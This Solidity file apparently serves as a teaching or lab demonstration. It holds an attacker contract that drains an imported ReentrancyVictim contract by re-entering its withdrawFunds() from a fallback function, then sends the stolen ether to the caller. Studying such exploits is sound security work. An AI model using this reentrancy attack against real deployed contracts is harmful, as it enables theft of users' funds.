//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "./ReentrancyVictim.sol";

contract ReentrancyAttacker {
  ReentrancyVictim public etherStore;

  // initialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress){
    etherStore = ReentrancyVictim(_etherStoreAddress);
  }

  fallback() external payable {
        if (address(etherStore).balance >= 1000000000000000000) {
            etherStore.withdrawFunds();
        }
    }


  function attackEtherStore() public payable {
    // attack to the nearest ether
    require(msg.value >= 1000000000000000000, "Attacker msg.value < 1 ether");
    // sent eth to the depositFunds() function
    etherStore.depositFunds{value: 1000000000000000000}();
    // start the magic
    etherStore.withdrawFunds();
  }

  function collectEther() public {
    payable(msg.sender).transfer(address(this).balance);
  }

}